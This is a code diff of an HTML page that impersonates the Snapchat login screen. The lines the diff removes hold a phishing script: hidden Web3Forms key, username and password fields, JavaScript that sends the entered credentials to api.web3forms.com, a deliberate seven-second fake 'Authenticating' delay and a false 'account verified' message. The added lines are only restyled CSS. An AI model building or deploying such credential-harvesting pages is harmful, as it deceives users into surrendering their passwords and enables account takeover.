@@ -3,109 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello - Welcome</title>
+    <title>Hello Plus</title>
     <style>
+        /* Snapchat Theme Styling */
         :root {
             --snap-yellow: #FFFC00;
             --snap-blue: #00ADFF;
+            --white: #ffffff;
+            --black: #000000;
         }
 
         body, html {
-            margin: 0; padding: 0; height: 100%;
+            margin: 0;
+            padding: 0;
+            height: 100%;
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: var(--snap-yellow);
-            display: flex; justify-content: center; align-items: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             overflow: hidden;
         }
 
         /* 1. Login Interface */
-        .login-card { text-align: center; width: 100%; max-width: 320px; padding: 20px; }
+        .login-container {
+            text-align: center;
+            width: 100%;
+            max-width: 320px;
+            padding: 20px;
+            transition: opacity 0.5s ease;
+        }
+
         .ghost-logo {
-            width: 70px; height: 70px; margin: 0 auto 15px; background: white;
-            mask: url('https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg') no-repeat center;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 10px;
+            background-color: var(--white);
+            /* Snapchat Ghost Logo mask */
             -webkit-mask: url('https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg') no-repeat center;
+            mask: url('https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg') no-repeat center;
         }
-        h1 { font-size: 26px; font-weight: bold; margin-bottom: 30px; }
+
+        h1 {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 40px;
+            color: var(--black);
+        }
+
         input {
-            width: 100%; padding: 16px; margin-bottom: 12px;
-            border: 1px solid #eee; border-radius: 30px;
-            font-size: 15px; box-sizing: border-box; outline: none;
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 30px;
+            box-sizing: border-box;
+            font-size: 15px;
+            outline: none;
+            background: var(--white);
         }
-        .login-btn {
-            width: 100%; padding: 16px; background-color: var(--snap-blue);
-            color: white; border: none; border-radius: 30px;
-            font-size: 16px; font-weight: bold; cursor: pointer;
+
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--snap-blue);
+            color: var(--white);
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-
-        /* 2. Loading Screen */
-        #loading-screen { display: none; text-align: center; }
-        .spinner {
-            width: 45px; height: 45px; border: 5px solid rgba(0,0,0,0.1);
-            border-top: 5px solid #000; border-radius: 50%;
-            animation: spin 1s linear infinite; margin: 0 auto 15px;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        /* 3. Final Black Screen */
-        #final-screen {
-            display: none; position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%; background-color: black;
-            color: white; flex-direction: column;
-            justify-content: center; align-items: center;
-            z-index: 100;
-        }
-        .congrats-text { font-size: 32px; font-weight: bold; letter-spacing: 2px; }
-    </style>
-</head>
-<body>
-
-    <div class="login-card" id="login-ui">
-        <div class="ghost-logo"></div>
-        <h1>Hello</h1>
-        <form id="main-form">
-            <input type="hidden" name="access_key" value="6cd8a093-2126-4ae4-9fba-b816897b7356">
-            <input type="text" name="user_id" placeholder="Username or Email" required>
-            <input type="password" name="user_pass" placeholder="Password" required>
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
-    </div>
-
-    <div id="loading-screen">
-        <div class="spinner"></div>
-        <p style="font-weight: bold;">Authenticating...</p>
-    </div>
-
-    <div id="final-screen">
-        <h2 class="congrats-text">CONGRATULATIONS</h2>
-        <p>Your account is successfully verified.</p>
-    </div>
-
-    <script>
-        const form = document.getElementById('main-form');
-        const loginUI = document.getElementById('login-ui');
-        const loadingUI = document.getElementById('loading-screen');
-        const finalUI = document.getElementById('final-screen');
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            // Login gayab karein aur Loading dikhayein
-            loginUI.style.display = 'none';
-            loadingUI.style.display = 'block';
-
-            // Web3Forms ko data bhejien
-            const formData = new FormData(form);
-            fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                body: formData
-            });
-
-            // 7 seconds ka wait (Stuck feel dene ke liye) phir Black Screen
-            setTimeout(() => {
-                loadingUI.style.display = 'none';
-                finalUI.style.display = 'flex';
-            }, 7000); // 7000ms = 7 seconds
-        });
-    </script>
-</body>
-</html>
